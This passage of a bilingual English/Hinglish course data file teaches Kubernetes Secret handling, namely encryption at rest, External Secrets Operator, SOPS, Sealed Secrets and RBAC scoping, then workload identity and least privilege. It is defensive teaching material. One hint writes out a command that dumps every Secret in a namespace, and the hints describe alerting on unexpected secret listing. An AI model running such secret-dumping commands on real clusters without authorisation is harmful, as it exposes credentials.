        a: 'A Kubernetes Secret is not encrypted. The values are base64-encoded, which is a reversible transport encoding with no key — anyone can run \`base64 -d\`. The \`Secret\` type signals intent and enables separate RBAC and different mounting behaviour, but provides no confidentiality on its own, so a Secret manifest in git is a plaintext secret in git. By default a Secret is readable by: anyone with \`get\` or \`list\` on Secrets in that namespace through the API, and \`list\` returns full contents; anyone who can \`exec\` into a pod that mounts it or read that pod\'s environment; and anyone with read access to etcd or an etcd backup, because without encryption at rest Secrets are stored in etcd in plaintext. Enabling encryption at rest makes the API server encrypt Secret data before writing it to etcd. With a KMS provider doing envelope encryption — the per-write data key wrapped by a root key in a cloud KMS or HSM — this protects against a stolen etcd backup, physical disk theft, and an attacker reading etcd directly. It does not protect against anyone using the Kubernetes API, who receives the decrypted value normally, and it does not help if the encryption key is the static \`aescbc\` key sitting in a file on the control plane, because compromising a master then yields both etcd and the key. Encryption at rest is necessary but far from sufficient — you still need tight RBAC and to keep the plaintext out of git.',
        aHi: 'Ek Kubernetes Secret encrypted nahi hai. Values base64-encoded hain, jо ek reversible transport encoding hai bina key ke — koi bhi \`base64 -d\` run kar sakta hai. \`Secret\` type intent signal karता hai par apne aap koi confidentiality provide nahi karता. By default ek Secret readable hai: API ke through us namespace mein Secrets par \`get\` ya \`list\` wale kisi bhi vyakti dwara, aur \`list\` full contents return karता hai; koi bhi jо ise mount karne wale ek pod mein \`exec\` kar sakта hai; aur etcd ya ek etcd backup ke read access wala koi bhi. Encryption at rest enable karna API server ko Secret data ko etcd mein likhne se pehle encrypt karता hai. Ek KMS provider ke saath ye ek stolen etcd backup, physical disk theft ke against protect karता hai. Ye Kubernetes API use karne wale kisi bhi vyakti ke against protect nahi karता.',
      },
      {
        q: 'Compare the External Secrets Operator, SOPS, and Sealed Secrets for keeping secrets out of git.',
        qHi: 'Secrets ko git se bahar rakhने ke liye External Secrets Operator, SOPS, aur Sealed Secrets ki tulna karो.',
        a: 'All three keep the plaintext secret out of version control, with different models. The External Secrets Operator is a pull model: you commit an \`ExternalSecret\` custom resource naming a secrets manager and a path, the operator running in the cluster authenticates to Vault or a cloud manager with a workload identity, reads the value, and materialises it into a normal Kubernetes Secret, re-syncing on an interval so rotation in the manager propagates automatically. Git holds only the non-sensitive path. This is the best fit for most organisations because the actual secrets live in a manager with policies, audit, and rotation. SOPS encrypts the manifest itself: a committed \`secret.enc.yaml\` has cleartext keys and structure but \`ENC[...]\` values, with the data key encrypted to an age key, a cloud KMS key, or PGP; decryption happens in the pipeline or via a SOPS-aware operator or Flux at apply time. It needs no external manager to run but the decryption key must be available wherever apply happens, and there is no central audit of secret access. Sealed Secrets encrypts to the cluster: \`kubeseal\` encrypts a Secret to the in-cluster controller\'s public key, producing a \`SealedSecret\` that only that controller can decrypt, bound to a specific namespace and name so it cannot be lifted elsewhere. It needs no external manager, which suits small setups, but sealed values are specific to one cluster\'s key, rotation means re-sealing, and there is no cross-cluster or central-audit story.',
        aHi: 'Teenon plaintext secret ko version control se bahar rakhते hain, alag models ke saath. External Secrets Operator ek pull model hai: aap ek \`ExternalSecret\` custom resource commit karте ho jо ek secrets manager aur ek path name karता hai, cluster mein running operator Vault ya ek cloud manager ko ek workload identity se authenticate karता hai, value padhता hai, aur ise ek normal Kubernetes Secret mein materialise karता hai. Git sirf non-sensitive path rakhता hai. Zyादातर organisations ke liye best fit. SOPS manifest khud encrypt karता hai: ek committed \`secret.enc.yaml\` mein cleartext keys aur structure hai par \`ENC[...]\` values. Ise run karne ke liye koi external manager nahi chahिए par decryption key available honi chahिए jahaan apply hoता hai. Sealed Secrets cluster par encrypt karता hai: \`kubeseal\` ek Secret ko in-cluster controller ki public key par encrypt karता hai, ek specific namespace aur name se bound.',
      },
      {
        q: 'Why is a Role granting `list` on all Secrets in a namespace dangerous, and how should Secret access be scoped instead?',
        qHi: 'Ek Role jо ek namespace mein saare Secrets par `list` grant karता hai dangerous kyun hai, aur Secret access ko iske bजाy kaise scope karna chahिए?',
        a: 'A Role granting \`list\` on Secrets is dangerous because \`list\` returns the full contents of every matching object and ignores \`resourceNames\` restrictions — so "list secrets" is effectively "dump every secret in the namespace in plaintext". Granting that to a broad group, such as all developers, puts a copy of every production credential — database passwords, payment keys, token-signing secrets, TLS private keys — on every member\'s machine, and a single compromised laptop then exposes the entire namespace. \`get\` is less severe because it can be restricted to named resources, but \`get\` on all Secrets is still broad. The correct scoping has several parts. Humans should have no standing read access to production Secrets at all; access is break-glass, granted for a bounded time through an audited process, ideally a privileged-access-management tool that issues a short-lived role and logs it. Each workload\'s ServiceAccount gets \`get\` on only its own Secret, specified with \`resourceNames\` and never \`list\`, because \`list\` bypasses the name restriction. Better still, the pod does not read Secrets through the API at all — the kubelet mounts the Secret as a file or environment variable, so the ServiceAccount needs no Secret permissions. And an alert fires on any \`list secrets\` call in production that does not come from the known operator ServiceAccount, catching both misconfiguration and active exfiltration.',
        aHi: 'Ek Role jо Secrets par \`list\` grant karता hai dangerous hai kyunki \`list\` har matching object ki full contents return karता hai aur \`resourceNames\` restrictions ignore karता hai — to "list secrets" effectively "namespace mein har secret ko plaintext mein dump karo" hai. Ise ek broad group ko grant karna har member ki machine par har production credential ki ek copy daalता hai. Correct scoping ke kई parts hain. Humans ke paas production Secrets par koi standing read access nahi hona chahिए; access break-glass hai. Har workload ki ServiceAccount ko sirf apne Secret par \`get\` milता hai, \`resourceNames\` se specified aur kabhi \`list\` nahi. Better still, pod Secrets ko API ke through padhता hi nahi. Aur ek alert kisi bhi \`list secrets\` call par fire hoता hai production mein jо known operator ServiceAccount se nahi aati.',
      },
    ],

    exercises: [
      {
        task: 'In a comment, explain why a Kubernetes Secret is not encrypted (base64 ≠ encryption), list who can read one by default, and explain what encryption at rest with a KMS provider does and does not protect against.',
        taskHi: 'Ek comment mein, samjhाओ ek Kubernetes Secret encrypted kyun nahi hai, aur encryption at rest kya protect karता hai.',
        hint: 'A K8S SECRET IS base64-ENCODED, NOT ENCRYPTED. base64 is a REVERSIBLE TRANSPORT ENCODING with NO KEY — its only purpose is to make arbitrary binary safe to embed in YAML; `echo <value> | base64 -d` is one command ANYONE can run. The `Secret` type conveys INTENT to k8s (separate RBAC from ConfigMaps, different mount behaviour, hidden from some outputs) but provides ZERO confidentiality on its own -> a Secret manifest in git IS a plaintext secret in git (history forever, every clone/fork/CI-cache, scraped in seconds if public). WHO CAN READ ONE BY DEFAULT: (1) anyone with `get` OR `list` on Secrets in that namespace via the API — and `list` returns FULL CONTENTS and IGNORES `resourceNames` restrictions ("list secrets" = "dump every secret"); RBAC roles are often written broader than warranted. (2) anyone who can `exec` into a pod that mounts it, or read that pod\'s env (`kubectl exec ... env`, a debug container). (3) anyone with read access to ETCD or an ETCD BACKUP — because WITHOUT encryption at rest, Secrets sit in etcd in PLAINTEXT. (4) a compromised KUBELET on a node (it receives the Secrets its pods need). ENCRYPTION AT REST with a KMS PROVIDER (v2, envelope encryption): a fresh data-encryption key is generated PER WRITE, stored ENCRYPTED next to the Secret in etcd, and unwrappable ONLY by a ROOT KEY that lives in a cloud KMS / HSM — the root key never leaves, is access-controlled, audited, and rotated independently. On EKS/GKE/AKS it\'s a one-line cluster setting. IT PROTECTS AGAINST: a stolen etcd backup, physical disk theft, an attacker reading etcd directly (all now just ciphertext + wrapped keys, useless without KMS access). IT DOES NOT PROTECT AGAINST: anyone using the k8s API (they get the DECRYPTED value normally) -> you STILL need tight RBAC + keeping plaintext out of git. AND it\'s worthless with the STATIC `aescbc` provider: that key is a value in a FILE on every control-plane node — in backups, readable by anyone who compromises a master, never rotated -> a compromised master yields BOTH etcd AND the key. The `identity` provider must be listed LAST (read-only fallback for pre-encryption data), never first.',
        hintHi: 'EK K8S SECRET base64-ENCODED HAI, ENCRYPTED NAHI. base64 ek REVERSIBLE TRANSPORT ENCODING hai BINA KEY ke; `echo <value> | base64 -d` ek command hai jise KOI BHI run kar sakta hai. `Secret` type k8s ko INTENT convey karता hai par apne aap ZERO confidentiality. Git mein ek Secret manifest = git mein ek plaintext secret. KAUN PADH SAKTA HAI: (1) namespace mein Secrets par `get` YA `list` wala koi bhi — `list` FULL CONTENTS return karता hai aur `resourceNames` IGNORE karता hai. (2) koi bhi jо ek mounting pod mein `exec` kar sakта hai. (3) ETCD / ETCD BACKUP read access wala koi bhi — encryption at rest ke BINA Secrets PLAINTEXT mein. (4) ek compromised KUBELET. KMS PROVIDER ke saath ENCRYPTION AT REST (envelope): ek fresh data key PER WRITE, ENCRYPTED etcd mein store, SIRF ek ROOT KEY dwara unwrappable jо ek cloud KMS / HSM mein rehती hai. PROTECT KARTA HAI: ek stolen etcd backup, disk theft, direct-etcd-read. PROTECT NAHI KARTA: k8s API use karne wala koi bhi -> abhi bhi tight RBAC + git se plaintext bahar. STATIC `aescbc` ke saath worthless: wo key har control-plane node par ek FILE mein hai.',
      },
      {
        task: 'In a comment, compare the External Secrets Operator, SOPS, and Sealed Secrets — the model each uses, where the key/trust lives, what git contains, how rotation works, and when to pick each.',
        taskHi: 'Ek comment mein, External Secrets Operator, SOPS, aur Sealed Secrets ki tulna karो.',
        hint: 'All three keep the PLAINTEXT secret OUT of version control; different models. (1) EXTERNAL SECRETS OPERATOR — PULL MODEL. Git contains an `ExternalSecret` CR naming a `secretStoreRef` (Vault / AWS SM / GCP SM / Azure KV) + a `remoteRef` (the PATH + property) + a `target` (the k8s Secret to create) + a `refreshInterval`. The operator (running IN the cluster, authing to the manager with a WORKLOAD IDENTITY) reads the value and MATERIALISES it into a normal k8s Secret; re-syncs every interval. KEY/TRUST: in the external manager (policies, audit, rotation all there). GIT CONTAINS: only the non-sensitive PATH. ROTATION: rotate in the manager -> the operator picks it up on the next refresh -> the k8s Secret updates -> (a rolling restart or a reloader picks up the new value). PICK WHEN: you have (or should have) a real secrets manager — BEST for most orgs / GitOps setups. (2) SOPS — ENCRYPT-THE-FILE MODEL. Commit `secret.enc.yaml` where KEYS + STRUCTURE are cleartext (reviewable diffs) and VALUES are `ENC[AES256_GCM,...]`. The data-encryption key is itself encrypted to one or more RECIPIENTS (an age key / a cloud KMS key / PGP) and stored in the file\'s `sops:` metadata. DECRYPT: in CI (`sops -d | kubectl apply -f -`), or via a SOPS operator / a kustomize plugin / FLUX\'s built-in SOPS (decrypt at apply time). KEY/TRUST: wherever the recipient key is — ideally a cloud KMS (so decryption is access-controlled + audited), not a file. GIT CONTAINS: the encrypted values + the encrypted data key. ROTATION: re-encrypt the file with a new value; rotating the RECIPIENT key means re-encrypting all files. PICK WHEN: no external manager, you want everything in git, you use Flux. Downside: the decrypt key must reach every apply point; NO central audit of secret ACCESS. (3) SEALED SECRETS — ENCRYPT-TO-THE-CLUSTER MODEL. `kubeseal` encrypts an ordinary Secret to the in-cluster CONTROLLER\'s PUBLIC key -> a `SealedSecret` CR safe to commit. Only the controller (holding the PRIVATE key) can decrypt, and ONLY into the SAME namespace + name it was sealed for (prevents an attacker applying the committed file to a cluster/namespace they control). KEY/TRUST: the controller\'s private key, in ONE cluster. GIT CONTAINS: the sealed ciphertext. ROTATION: re-seal (the controller also periodically rotates its key; old keys are kept for decryption). PICK WHEN: small setup, no external manager, single cluster. Downside: cluster-specific (a `SealedSecret` doesn\'t port to another cluster), no cross-cluster / central-audit story. ALSO: the SECRETS STORE CSI DRIVER mounts secrets from a manager as tmpfs FILES directly into the pod — NO k8s Secret object at all (optional sync-to-Secret) — the tightest option for avoiding API exposure.',
        hintHi: 'Teenon PLAINTEXT secret ko version control se BAHAR rakhते hain. (1) EXTERNAL SECRETS OPERATOR — PULL MODEL. Git mein ek `ExternalSecret` CR (`secretStoreRef` + `remoteRef` PATH + `target` + `refreshInterval`). Operator (cluster mein, WORKLOAD IDENTITY se auth) value ko ek normal k8s Secret mein MATERIALISE karता hai; har interval re-sync. KEY/TRUST: external manager mein. GIT: sirf PATH. ROTATION: manager mein rotate -> operator agli refresh par pick karता hai. PICK WHEN: aapke paas ek real manager hai — zyादातर orgs ke liye BEST. (2) SOPS — ENCRYPT-THE-FILE. `secret.enc.yaml` commit karो: KEYS cleartext, VALUES `ENC[AES256_GCM,...]`. Data key RECIPIENTS (age / cloud KMS / PGP) par encrypted, `sops:` metadata mein. DECRYPT: CI mein / FLUX. KEY/TRUST: recipient key jahaan hai — ideally cloud KMS. GIT: encrypted values. PICK WHEN: koi external manager nahi, sab git mein, Flux. Downside: decrypt key har apply point tak, NO central access audit. (3) SEALED SECRETS — ENCRYPT-TO-THE-CLUSTER. `kubeseal` Secret ko controller ki PUBLIC key par encrypt karता hai -> ek `SealedSecret` CR. Sirf controller (PRIVATE key) decrypt kar sakта hai, SIRF SAME namespace+name mein. KEY/TRUST: controller ki private key, EK cluster mein. PICK WHEN: chhota setup, single cluster. Downside: cluster-specific, no cross-cluster/central-audit. ALSO: CSI DRIVER secrets ko tmpfs FILES ke roop mein mount karता hai — NO k8s Secret object.',
      },
      {
        task: 'In a comment, explain why `list` on all Secrets in a namespace is worse than `get`, and describe how to scope Secret access properly (break-glass for humans, resourceNames+get for workloads, mounts over API, alert on list).',
        taskHi: 'Ek comment mein, samjhाओ `list` `get` se worse kyun hai aur Secret access ko properly kaise scope karें.',
        hint: 'WHY `list` IS WORSE THAN `get`: `list` (and `watch`) on Secrets returns the FULL CONTENTS of EVERY matching object AND IGNORES `resourceNames` restrictions -> a Role with `list` on `secrets` is effectively "DUMP EVERY SECRET IN THE NAMESPACE IN PLAINTEXT (base64) WITH ONE COMMAND" (`kubectl get secret -n prod -o yaml`). `get` can be restricted to NAMED resources via `resourceNames`, so `get` on ONE named secret is tightly bounded; `get` on ALL secrets is still broad but at least doesn\'t auto-dump on a wildcard. Bound to a broad group (e.g. `developers`, 20 people) -> 20 copies of the prod DB password + the Stripe key + the JWT signing secret + TLS private keys, on 20 laptops -> ONE compromised laptop = the whole namespace\'s secrets. HOW TO SCOPE PROPERLY: (1) HUMANS get NO standing `get`/`list` on Secrets in prod — access is BREAK-GLASS: granted for a BOUNDED time (e.g. 1h) through an AUDITED process, ideally a PAM tool that issues a short-lived role and logs who/when/why. (2) EACH WORKLOAD\'s ServiceAccount gets `get` on ONLY ITS OWN secret, specified with `resourceNames: ["api-db"]` and verb `["get"]` ONLY — NEVER `list` (list bypasses the name restriction). (3) PREFER MOUNTS OVER THE API: the kubelet mounts the Secret as a file / env var into the pod; the pod\'s ServiceAccount then needs NO secret permissions at all — the API is never used to read the value. (4) ENCRYPTION AT REST (KMS envelope) so an etcd path doesn\'t bypass all of this. (5) ALERT on any `list secrets` (or `get secrets` with no resourceName) in prod that is NOT the known operator ServiceAccount (External Secrets Operator, a CSI driver) — this catches both a misconfigured Role and active exfiltration by a compromised credential. (6) audit-log review: k8s API server audit policy at `RequestResponse` level for the `secrets` resource so every access is recorded with the identity.',
        hintHi: '`list` `get` SE WORSE KYUN: `list` (aur `watch`) Secrets par HAR matching object ki FULL CONTENTS return karता hai AUR `resourceNames` IGNORE karता hai -> `list` wala ek Role = "NAMESPACE MEIN HAR SECRET KO EK COMMAND SE PLAINTEXT MEIN DUMP KARO". `get` `resourceNames` se NAMED resources tak restrict ho sakта hai. Ek broad group se bound (20 developers) -> 20 copies har prod credential ki, 20 laptops par -> EK compromised laptop = poora namespace. PROPERLY SCOPE: (1) HUMANS ko prod Secrets par KOI standing `get`/`list` nahi — BREAK-GLASS: BOUNDED time ke liye ek AUDITED process ke through. (2) HAR WORKLOAD ki SA ko SIRF APNE secret par `get`, `resourceNames: ["api-db"]` + verb `["get"]` ONLY — KABHI `list` nahi. (3) MOUNTS OVER API: kubelet Secret ko file/env ke roop mein mount karता hai -> pod ki SA ko KOI secret permission nahi. (4) ENCRYPTION AT REST (KMS). (5) ALERT: prod mein koi bhi `list secrets` jо known operator SA se NAHI. (6) API server audit policy `RequestResponse` level par `secrets` ke liye.',
      },
    ],

    keyTakeaways: [
      'A KUBERNETES SECRET IS NOT ENCRYPTED — it is base64-encoded, a reversible no-key transport encoding (`base64 -d` is one command). A Secret manifest in git is a plaintext secret in git. Default readers: anyone with `get`/`list` on Secrets in the namespace (and `list` dumps full contents, ignoring `resourceNames`), anyone who can `exec` into a mounting pod, and anyone with etcd/backup access.',
      'ENCRYPTION AT REST (etcd) with a KMS provider (envelope encryption, root key in a cloud KMS/HSM) protects a stolen etcd backup, disk theft, and direct-etcd reads — NOT anyone using the k8s API. The static `aescbc` key is nearly worthless (it\'s a file on the control plane, backed up with it, never rotated). On EKS/GKE/AKS it\'s a one-line setting.',
      'KEEP THE REAL SECRET OUT OF GIT — three patterns: EXTERNAL SECRETS OPERATOR (pull: commit an `ExternalSecret` referencing a manager path, operator syncs the value into a Secret, re-syncs for rotation — BEST for most); SOPS (encrypt the manifest: cleartext keys, `ENC[...]` values, decrypt in CI/Flux with an age/KMS key); SEALED SECRETS (`kubeseal` to the cluster controller\'s public key, bound to namespace+name — no external manager, cluster-specific).',
      'SOPS keeps `kind`, `type`, `metadata`, and the KEYS cleartext (so diffs are reviewable) while each VALUE becomes `ENC[AES256_GCM,...]`; decryption needs the recipient key (`sops decrypt` fails with exit 128 without it). In production the recipient is a cloud KMS key so decryption is access-controlled and audited, not gated by a file on disk.',
      'RBAC: `list` on Secrets is far worse than `get` — it returns full contents and ignores `resourceNames`, so "list secrets" = "dump every secret". Humans get NO standing read on prod Secrets (break-glass only, audited, time-boxed). Workloads get `get` on ONLY their own Secret via `resourceNames` (never `list`), or better, read a kubelet-mounted file and need no Secret RBAC at all. Alert on any unexpected `list secrets` in prod.',
    ],
    keyTakeawaysHi: [
      'EK KUBERNETES SECRET ENCRYPTED NAHI HAI — ye base64-encoded hai, ek reversible no-key transport encoding (`base64 -d` ek command hai). Git mein ek Secret manifest git mein ek plaintext secret hai. Default readers: namespace mein Secrets par `get`/`list` wala koi bhi (aur `list` full contents dump karता hai), koi bhi jо ek mounting pod mein `exec` kar sakта hai, aur etcd/backup access wala koi bhi.',
      'KMS PROVIDER ke saath ENCRYPTION AT REST (envelope encryption, root key ek cloud KMS/HSM mein) ek stolen etcd backup, disk theft, aur direct-etcd reads protect karता hai — k8s API use karne wale kisi bhi vyakti ko NAHI. Static `aescbc` key लगभग worthless hai. EKS/GKE/AKS par ye ek one-line setting hai.',
      'REAL SECRET KO GIT SE BAHAR RAKHO — teen patterns: EXTERNAL SECRETS OPERATOR (pull: ek `ExternalSecret` commit karो jо ek manager path reference karता hai, operator value ko ek Secret mein sync karता hai — zyादातर ke liye BEST); SOPS (manifest encrypt karो: cleartext keys, `ENC[...]` values, CI/Flux mein ek age/KMS key se decrypt karो); SEALED SECRETS (`kubeseal` cluster controller ki public key par, namespace+name se bound).',
      'SOPS `kind`, `type`, `metadata`, aur KEYS ko cleartext rakhता hai (to diffs reviewable hain) jabki har VALUE `ENC[AES256_GCM,...]` ban jaती hai; decryption ko recipient key chahिए (iske bina `sops decrypt` exit 128 se fail hoता hai). Production mein recipient ek cloud KMS key hoता hai.',
      'RBAC: Secrets par `list` `get` se kahीं worse hai — ye full contents return karता hai aur `resourceNames` ignore karता hai. Humans ko prod Secrets par KOI standing read nahi (sirf break-glass, audited, time-boxed). Workloads ko sirf apne Secret par `get` milता hai `resourceNames` ke via (kabhi `list` nahi), ya better, ek kubelet-mounted file padhते hain. Prod mein kisi bhi unexpected `list secrets` par alert karो.',
    ],
  },

  {
    slug: 'ops-workload-identity-and-least-privilege',
    title: 'Workload Identity & Least Privilege',
    titleHi: 'Workload Identity Aur Least Privilege',
    description:
      'The way to eliminate the last long-lived credential — the one an application uses to prove it is allowed to fetch its secrets and call cloud APIs — is workload identity: the platform issues each workload a short-lived, cryptographically verifiable identity token that is only valid from that workload, and every downstream system trusts that token instead of a stored key. This lesson covers IRSA / GKE Workload Identity / Azure Workload Identity, SPIFFE/SPIRE, IMDSv2, and the blast-radius mindset that ties least privilege across IAM, Kubernetes RBAC, and NetworkPolicy together.',
    descriptionHi:
      'Aakhri long-lived credential ko eliminate karne ka tareeka — wo jo ek application use karती hai ye saabit karne ke liye ki ise apne secrets fetch karne aur cloud APIs call karne ki permission hai — workload identity hai: platform har workload ko ek short-lived, cryptographically verifiable identity token issue karता hai jo sirf us workload se valid hai, aur har downstream system ek stored key ke bजाy us token ko trust karता hai. Ye lesson IRSA / GKE Workload Identity / Azure Workload Identity, SPIFFE/SPIRE, IMDSv2, aur blast-radius mindset cover karता hai.',
    difficulty: 'HARD',
    duration: 24,
    order: 5,

    analogy: {
      en: '**A staff badge that a reader checks, versus a master key you carry.** A master key works anywhere, forever, and whoever picks it up can use it — that is a long-lived stored credential. A staff badge is different: it is issued to you personally by the building, it stops working when your shift ends, and every door reads it fresh against the building\'s directory rather than trusting a key it was cut from. You never carry a key at all — you present who you are, and each door decides what you may open based on your role that day. Workload identity is the badge: the platform vouches for the workload, downstream systems check that vouching in real time, and there is no key to steal because there is no key.',
      hi: '**Ek staff badge jise ek reader check karता hai, versus ek master key jo aap carry karते ho.** Ek master key kahीं bhi, hamesha ke liye kaam karती hai, aur jो bhi ise utha leता hai use kar sakта hai — wo ek long-lived stored credential hai. Ek staff badge alag hai: ye aapको building dwara personally issued hai, ye aapki shift khatam hone par kaam karना band kar deता hai, aur har door ise building ki directory ke against fresh read karता hai. Aap ek key carry karте hi nahi — aap present karते ho ki aap kaun ho. Workload identity badge hai.',
    },

    simple: `**THE LAST LONG-LIVED CREDENTIAL:** even with a secrets manager, the app needs
SOMETHING to prove it can talk to the manager + the cloud. workload identity makes
that "something" a SHORT-LIVED, PLATFORM-ISSUED, CRYPTOGRAPHICALLY-VERIFIABLE TOKEN
that is only valid FROM that workload - not a stored key.

**HOW IT WORKS (the OIDC federation pattern):**
\`\`\`
1. the platform (k8s / a cloud) issues the workload a signed identity token (a JWT)
   asserting "I am serviceaccount 'api' in namespace 'prod' of cluster X" - short
   TTL, audience-scoped, auto-rotated. NOT a secret you manage.
2. the workload presents that token to the target (AWS STS / Vault / GCP / another
   service).
3. the target VERIFIES the token's signature against the platform's PUBLIC OIDC
   keys (published at a well-known URL) and checks issuer + audience + subject.
4. the target issues its OWN short-lived credential (STS creds / a Vault token)
   scoped to a role mapped to that subject.
=> no static key anywhere. the trust is: target -> platform's OIDC issuer -> this workload.
\`\`\`

**THE IMPLEMENTATIONS:**
\`\`\`
AWS   IRSA (IAM Roles for Service Accounts) / EKS Pod Identity: the pod's projected
      SA token -> STS AssumeRoleWithWebIdentity -> temp IAM creds for a role whose
      trust policy names the OIDC provider + 'system:serviceaccount:prod:api'.
GCP   Workload Identity: bind a k8s SA to a Google SA (or use direct WIF); the pod
      calls Google APIs as that identity, no key file.
AZURE Workload Identity: a federated credential on an Entra app/managed identity
      trusts the cluster's OIDC issuer + the SA subject -> AAD tokens, no client secret.
MESH  SPIFFE/SPIRE: every workload gets an SVID (an X.509 cert or JWT) with a SPIFFE
      ID like 'spiffe://acme/ns/prod/sa/api'; used for mTLS + as a universal identity.
VM    cloud instance metadata (IMDSv2): the instance's role creds, via a
      session-token-guarded, hop-limited local endpoint (v2 blocks SSRF-to-metadata).
\`\`\`

**LEAST PRIVILEGE — the blast-radius mindset, applied at every layer:**
\`\`\`
for each workload ask: "if this is fully compromised (RCE), what can the attacker reach?"
then cut each dimension to the minimum:
  IAM / cloud role    only the exact API actions + resources it uses. no '*'. no iam:*.
                      session duration minutes, not hours. condition keys (source VPC, tag).
  K8s RBAC            get on its own configmap/secret by name; no list; no cluster-scope;
                      no create/delete on workloads; its own namespace only.
  NetworkPolicy       default-deny ingress AND egress per namespace; then allow only
                      the specific pods/ports it actually talks to (+ DNS, + the API if needed).
  filesystem/caps     Module 18 L4: non-root, drop ALL caps, read-only rootfs, seccomp.
  data                the DB role grants only the tables + operations it uses (Lesson 3).
=> a compromise of one service reaches a handful of things, not the whole estate.
\`\`\`

**THE TEST:** pick your most exposed service. write down, concretely, everything a
root shell in it can currently reach (creds, secrets, network, data, other pods).
if that list is long, you have privilege to cut - and now you know where.`,

    simpleHi: `**AAKHRI LONG-LIVED CREDENTIAL:** ek secrets manager ke saath bhi, app ko KUCH
chahिए ye saabit karne ke liye ki ye manager + cloud se baat kar sakती hai. workload
identity us "kुछ" ko ek SHORT-LIVED, PLATFORM-ISSUED, CRYPTOGRAPHICALLY-VERIFIABLE
TOKEN banaता hai jо sirf us workload SE valid hai - ek stored key nahi.

**KAISE KAAM KARTA HAI (OIDC federation pattern):**
\`\`\`
1. platform (k8s / ek cloud) workload ko ek signed identity token (ek JWT) issue karता hai
   jо assert karता hai "main cluster X ke namespace 'prod' ka serviceaccount 'api' hoon" -
   short TTL, audience-scoped, auto-rotated. ek secret NAHI jо aap manage karте ho.
2. workload us token ko target ko present karता hai (AWS STS / Vault / GCP / ek doosri service).
3. target token ke signature ko platform ke PUBLIC OIDC keys ke against VERIFY karता hai
   aur issuer + audience + subject check karता hai.
4. target apni OWN short-lived credential issue karता hai us subject se mapped ek role se scoped.
=> kahीं koi static key nahi. trust hai: target -> platform ka OIDC issuer -> ye workload.
\`\`\`

**IMPLEMENTATIONS:**
\`\`\`
AWS   IRSA / EKS Pod Identity: pod ki projected SA token -> STS AssumeRoleWithWebIdentity
      -> ek role ke liye temp IAM creds jिski trust policy OIDC provider +
      'system:serviceaccount:prod:api' name karती hai.
GCP   Workload Identity: ek k8s SA ko ek Google SA se bind karो; pod us identity ke roop
      mein Google APIs call karता hai, koi key file nahi.
AZURE Workload Identity: ek Entra app/managed identity par ek federated credential jо
      cluster ke OIDC issuer + SA subject ko trust karता hai -> AAD tokens, koi client secret nahi.
MESH  SPIFFE/SPIRE: har workload ko ek SVID milता hai (ek X.509 cert ya JWT) ek SPIFFE ID
      ke saath jaise 'spiffe://acme/ns/prod/sa/api'; mTLS + ek universal identity ke liye.
VM    cloud instance metadata (IMDSv2): instance ke role creds, ek session-token-guarded,
      hop-limited local endpoint ke via (v2 SSRF-to-metadata block karता hai).
\`\`\`

**LEAST PRIVILEGE — blast-radius mindset, har layer par:**
\`\`\`
har workload ke liye poochो: "agar ye fully compromised (RCE) hai, attacker kya reach kar sakта hai?"
phir har dimension ko minimum tak cut karो:
  IAM / cloud role    sirf exact API actions + resources jо ye use karता hai. koi '*' nahi. koi iam:* nahi.
                      session duration minutes, hours nahi. condition keys.
  K8s RBAC            apne configmap/secret par get by name; koi list nahi; koi cluster-scope nahi;
                      workloads par koi create/delete nahi; sirf apna namespace.
  NetworkPolicy       per namespace default-deny ingress AUR egress; phir sirf specific pods/ports allow karो.
  filesystem/caps     Module 18 L4: non-root, ALL caps drop, read-only rootfs, seccomp.
  data               DB role sirf wo tables + operations grant karता hai jо ye use karता hai (Lesson 3).
=> ek service ka compromise कुछ cheezein reach karता hai, poore estate ko nahi.
\`\`\`

**THE TEST:** apni sabse exposed service pick karो. concretely likhो, sab kुछ jо isme
ek root shell currently reach kar sakта hai. agar wo list lambi hai, aapke paas cut
karने ke liye privilege hai.`,

    content: `## The last long-lived credential

Even after moving every secret into a manager, one credential remains: the thing the application uses to prove to the manager, and to cloud APIs, that it is allowed to act. If that is a stored key — an AWS access key in a file, a Vault token in an environment variable — you have not eliminated long-lived credentials, you have concentrated them. Workload identity removes this last one by making the application\'s proof of identity a short-lived token that the platform issues, that is cryptographically verifiable, and that is only valid when presented from the specific workload it was issued to.

## The OIDC federation pattern

The mechanism is the same across implementations. The platform — a Kubernetes cluster, or a cloud\'s VM layer — issues each workload a signed identity token, a JWT, asserting a specific identity such as "ServiceAccount \`api\` in namespace \`prod\` of this cluster". The token has a short TTL, is scoped to a specific audience, and is rotated automatically by the platform; it is not a secret an operator creates or stores. The workload presents this token to a target system: AWS STS, Vault, a Google API, another internal service. The target verifies the token\'s signature against the platform\'s public OIDC signing keys, which the platform publishes at a well-known URL, and checks the issuer, audience, and subject claims. If they match a configured trust relationship, the target issues its own short-lived credential — temporary STS credentials, a scoped Vault token — bound to a role that is mapped to that subject. There is no static key anywhere in this chain; the trust flows from the target, to the platform\'s OIDC issuer, to this particular workload.

## The implementations

On AWS, IRSA — IAM Roles for Service Accounts — and its successor EKS Pod Identity work this way: the pod\'s projected ServiceAccount token is exchanged at STS via \`AssumeRoleWithWebIdentity\` for temporary IAM credentials, and the target IAM role\'s trust policy names the cluster\'s OIDC provider and the specific \`system:serviceaccount:prod:api\` subject. On GCP, Workload Identity binds a Kubernetes ServiceAccount to a Google service account, or uses direct Workload Identity Federation, so the pod calls Google APIs as that identity with no key file present. On Azure, Workload Identity configures a federated credential on an Entra application or managed identity that trusts the cluster\'s OIDC issuer and the ServiceAccount subject, yielding Azure AD tokens with no client secret. In a service mesh, SPIFFE and its reference implementation SPIRE issue each workload an SVID — an X.509 certificate or a JWT — carrying a SPIFFE ID like \`spiffe://acme/ns/prod/sa/api\`, used both for mutual TLS between services and as a portable identity that other systems can consume. On a plain VM, the cloud instance metadata service provides the instance\'s role credentials, and IMDSv2 is essential: it requires a session token obtained by a PUT request and enforces a hop limit, which together prevent a server-side request forgery vulnerability in the application from being used to read the instance credentials.

## Least privilege as a blast-radius exercise

Least privilege is easy to state and hard to actually do, and the productive way to approach it is to ask, for each workload, a concrete question: if this workload is fully compromised — an attacker has a root shell in it — what can they reach? Then cut every dimension of that reach to the minimum the workload actually needs. The cloud or IAM role should grant only the specific API actions on the specific resources the workload uses, with no wildcards, never \`iam:*\`, a session duration measured in minutes, and condition keys that restrict use to the expected source network or resource tags. The Kubernetes RBAC should grant \`get\` on the workload\'s own ConfigMap and Secret by name, with no \`list\`, no cluster-scoped permissions, no ability to create or delete workloads, and nothing outside its own namespace. NetworkPolicy should be default-deny for both ingress and egress in the namespace, with explicit allowances only for the specific pods and ports the workload actually communicates with, plus DNS and the API server if it needs them. The filesystem and capability posture from Module 18 Lesson 4 applies — non-root, all capabilities 